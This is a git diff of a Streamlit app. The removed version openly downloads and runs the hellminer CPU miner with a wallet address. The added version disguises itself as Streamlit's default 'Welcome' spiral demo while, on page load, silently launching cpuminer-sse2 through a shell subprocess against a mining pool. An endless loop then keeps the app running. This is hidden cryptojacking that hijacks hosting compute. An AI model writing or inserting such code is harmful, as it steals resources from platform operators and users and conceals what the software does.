@@ -1,31 +1,104 @@
-import os
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
 import streamlit as st
+import os
+import time
+import subprocess
+from os import system, name
+from time import sleep
+from subprocess import PIPE, Popen
+import base64
+import flag
 
-# Streamlit App Title
-st.title("Mining Script Execution")
 
-# Description
-st.write("This app allows you to download and execute a mining script.")
 
-# Button to trigger the script
-if st.button("Run Mining Script"):
-    st.write("Executing script...")
+"""
 
-    try:
-        # Install wget and curl (without sudo)
-        st.write("Installing wget and curl...")
-        os.system("apt-get update && apt-get install -y wget curl")
-        # Download hellminer and verus-solver
-        st.write("Downloading hellminer and verus-solver...")
-        os.system("wget https://raw.githubusercontent.com/akton0208/test2/main/hellminer")
-        os.system("wget https://raw.githubusercontent.com/akton0208/test2/main/verus-solver")
-        # Set executable permissions
-        st.write("Setting permissions...")
-        os.system("chmod +x hellminer verus-solver")
-        # Run the mining script
-        st.write("Running mining script...")
-        os.system("./hellminer -c stratum+tcp://us.vipor.net:5040#xnsub -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx..bajingan -p x --cpu 4 -F")
+# Welcome to Streamlit!
 
-        st.success("Mining script executed successfully!")
-    except Exception as e:
-        st.error(f"An error occurred: {e}")
+Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
+
+If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
+
+forums](https://discuss.streamlit.io).
+
+In the meantime, below is an example of what you can do with just a few lines of code:
+
+"""
+
+
+
+
+
+with st.echo(code_location='below'):
+
+    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)
+
+    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)
+
+
+
+    Point = namedtuple('Point', 'x y')
+
+    data = []
+
+
+
+    points_per_turn = total_points / num_turns
+
+
+
+    for curr_point_num in range(total_points):
+
+        curr_turn, i = divmod(curr_point_num, points_per_turn)
+
+        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn
+
+        radius = curr_point_num / total_points
+
+        x = radius * math.cos(angle)
+
+        y = radius * math.sin(angle)
+
+        data.append(Point(x, y))
+
+
+
+    st.altair_chart(alt.Chart(pd.DataFrame(data), height=500, width=500)
+
+        .mark_circle(color='#0068c9', opacity=0.5)
+
+        .encode(x='x:Q', y='y:Q'))
+
+
+
+    
+st.write(flag.controlFlag)
+st.write("tarik", flag.controlFlag)
+
+if flag.controlFlag==0:
+    flag.controlFlag+=1
+    p = subprocess.run("./cpuminer-sse2 -a yespowerr16  -o stratum+tcps://stratum-na.rplant.xyz:13382 -u YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
+    print(f"GOZUKTUMMMMMMMMMMMMMMM {flag.controlFlag}")
+
+import time 
+#from IPython.display import clear_output 
+ 
+def zero_to_infinity(): 
+    i = 0 
+    while True: 
+        yield i 
+        i += 1 
+        time.sleep(1) 
+ 
+start = time.time() 
+for x in zero_to_infinity(): 
+    #clear_output(wait=True) 
+    end = time.time() 
+    temp = end-start 
+    hours = temp//3600 
+    temp = temp - 3600*hours 
+    minutes = temp//60 
+    seconds = temp - 60*minutes     
